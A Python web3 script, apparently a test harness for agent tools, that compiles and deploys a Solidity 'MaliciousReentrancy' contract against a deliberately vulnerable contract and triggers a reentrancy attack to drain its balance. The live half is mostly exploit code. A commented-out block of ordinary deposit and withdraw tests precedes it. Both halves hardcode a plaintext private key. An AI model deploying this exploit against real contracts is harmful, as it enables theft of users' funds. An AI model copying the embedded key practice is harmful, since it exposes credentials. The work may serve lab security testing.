# from web3 import Web3
# import json
# import os
# from api.agents.tools import *
# from api.web3_connection import get_web3_connection

# # Load the ABI for the BasicVulnerableContract
# abi_path = os.path.join(os.path.dirname(__file__), "../abi/BasicVulnerableContractABI.json")
# with open(abi_path, 'r') as f:
#     basic_contract_abi = json.load(f)

# # Define contract address and private key
# my_contract_address = "0x8AdD1b01116cAcAE62D9bcCbF43aa002C47CF2e7"
# private_key = "a4af72ca5e6acefeea8593fd689892757bfd2df55bd7aff7b8d410cf4846a995"
# test_user_address = "0x13d6Fa5134AA6FC64E43679F9E24B7788c3Ab8E9"

# # Initialize Web3 connection
# w3 = get_web3_connection()

# # Function to check the balance of the interacting address
# def check_account_balance():
#     print("Checking account balance")
#     try:
#         account = w3.eth.account.from_key(private_key)
#         balance = w3.eth.get_balance(account.address)
#         balance_in_eth = w3.from_wei(balance, 'ether')
#         print(f"Account {account.address} has a balance of {balance_in_eth} ETH")
#         return balance_in_eth
#     except Exception as e:
#         print(f"Error in checking account balance: {str(e)}")
#         return None

# # Test the getContractBalance function
# def test_check_contract_balance():
#     print("Testing getContractBalance")
#     try:
#         # Define the account using your private key
#         account = w3.eth.account.from_key(private_key)
        
#         # Call the function with the 'from_address' parameter
#         contract_balance = call_function(
#             w3, my_contract_address, basic_contract_abi, "getContractBalance",
#             from_address=account.address
#         )
#         print(f"Contract balance: {contract_balance} wei")
#     except Exception as e:
#         print(f"Error in getContractBalance: {str(e)}")


# # Test the deposit function (with payable transaction)
# def test_deposit_funds():
#     print("Testing deposit function")
#     try:
#         txn_hash = send_payable_transaction(w3, private_key, my_contract_address, basic_contract_abi, "deposit", value=w3.to_wei(0.000001, 'ether'))
#         print(f"Deposit transaction hash: {txn_hash}")
#     except Exception as e:
#         print(f"Error in deposit: {str(e)}")

# # Test the withdraw function
# def test_withdraw_funds():
#     print("Testing withdraw function")
#     try:
#         withdraw_amount = w3.to_wei(0.5, 'ether')
#         txn_hash = send_transaction(w3, private_key, my_contract_address, basic_contract_abi, "withdraw", withdraw_amount)
#         print(f"Withdraw transaction hash: {txn_hash}")
#     except Exception as e:
#         print(f"Error in withdraw: {str(e)}")

# # Test checking a user's balance using the balances function
# def test_check_user_balance(user_address):
#     print(f"Testing balances function for user {user_address}")
#     try:
#         account = w3.eth.account.from_key(private_key)
#         user_balance = call_function(
#             w3, my_contract_address, basic_contract_abi, "balances",
#             user_address,
#             from_address=account.address
#         )
#         print(f"User balance: {user_balance} wei")
#     except Exception as e:
#         print(f"Error in checking user balance: {str(e)}")


# # Test the resetBalance function
# def test_reset_user_balance(user_address):
#     print(f"Testing resetBalance function for user {user_address}")
#     try:
#         txn_hash = send_transaction(w3, private_key, my_contract_address, basic_contract_abi, "resetBalance", user_address)
#         print(f"Reset balance transaction hash: {txn_hash}")
#     except Exception as e:
#         print(f"Error in resetBalance: {str(e)}")

# def main():
#     # Check the account balance first
#     balance_in_eth = check_account_balance()

#     # Proceed with the tests only if there is sufficient balance
#     if balance_in_eth is not None and balance_in_eth > 0:
#         test_check_contract_balance()
#         test_deposit_funds()
#         test_withdraw_funds()
#         test_check_user_balance(test_user_address)
#         test_reset_user_balance(test_user_address)
#     else:
#         print("Insufficient balance to perform transactions")

# if __name__ == "__main__":
#     main()


from web3 import Web3
import os
import json
from api.agents.tools import compile_solidity_contract, deploy_malicious_contract, trigger_reentrancy_attack
from api.web3_connection import get_web3_connection

# Load the ABI for the BasicVulnerableContract
abi_path = os.path.join(os.path.dirname(__file__), "../abi/BasicVulnerableContractABI.json")
with open(abi_path, 'r') as f:
    basic_contract_abi = json.load(f)

# Define contract address and private key
my_contract_address = "0x8AdD1b01116cAcAE62D9bcCbF43aa002C47CF2e7"
private_key = "a4af72ca5e6acefeea8593fd689892757bfd2df55bd7aff7b8d410cf4846a995"

# Initialize Web3 connection
w3 = get_web3_connection()

# Function to check the balance of the interacting address
def check_account_balance():
    print("Checking account balance")
    try:
        account = w3.eth.account.from_key(private_key)
        balance = w3.eth.get_balance(account.address)
        balance_in_eth = w3.from_wei(balance, 'ether')
        print(f"Account {account.address} has a balance of {balance_in_eth} ETH")
        return balance_in_eth
    except Exception as e:
        print(f"Error in checking account balance: {str(e)}")
        return None

# Test deploying the malicious contract
def test_deploy_malicious_contract():
    print("Deploying malicious contract for reentrancy attack...")
    malicious_contract_source = """
    pragma solidity ^0.8.0;

    contract MaliciousReentrancy {
        address public vulnerableContract;
        
        constructor(address _vulnerableContract) {
            vulnerableContract = _vulnerableContract;
        }

        function attack() public payable {
            require(msg.value > 0);
            (bool success,) = vulnerableContract.call{value: msg.value}(
                abi.encodeWithSignature("withdraw(uint256)", msg.value)
            );
            require(success, "Attack failed");
        }

        receive() external payable {
            // Reentrancy attack logic here
            if (address(vulnerableContract).balance > 0) {
                (bool success,) = vulnerableContract.call(
                    abi.encodeWithSignature("withdraw(uint256)", msg.value)
                );
                require(success, "Reentrancy failed");
            }
        }
    }
    """
    try:
        compiled_contract = compile_solidity_contract(malicious_contract_source)
        if compiled_contract:
            contract_address = deploy_malicious_contract(
                w3, private_key, compiled_contract['bytecode'], compiled_contract['abi'], my_contract_address
            )
            print(f"Malicious contract deployed at: {contract_address}")
            return contract_address, compiled_contract['abi']
        else:
            print("Compilation failed.")
            return None, None
    except Exception as e:
        print(f"Error in deploying malicious contract: {e}")
        return None, None

# Test triggering the reentrancy attack
def test_trigger_reentrancy_attack(malicious_contract_address, malicious_contract_abi):
    print("Triggering reentrancy attack...")
    try:
        txn_hash = trigger_reentrancy_attack(w3, private_key, malicious_contract_abi, malicious_contract_address)
        print(f"Reentrancy attack triggered, transaction hash: {txn_hash}")
    except Exception as e:
        print(f"Error in triggering reentrancy attack: {e}")

def main():
    # Check the account balance first
    balance_in_eth = check_account_balance()

    # Proceed with the tests only if there is sufficient balance
    if balance_in_eth is not None and balance_in_eth > 0.1:
        # Test deploying the malicious contract
        malicious_contract_address, malicious_contract_abi = test_deploy_malicious_contract()

        # If the deployment was successful, trigger the reentrancy attack
        if malicious_contract_address and malicious_contract_abi:
            test_trigger_reentrancy_attack(malicious_contract_address, malicious_contract_abi)
    else:
        print("Insufficient balance to perform transactions")


if __name__ == "__main__":
    main()
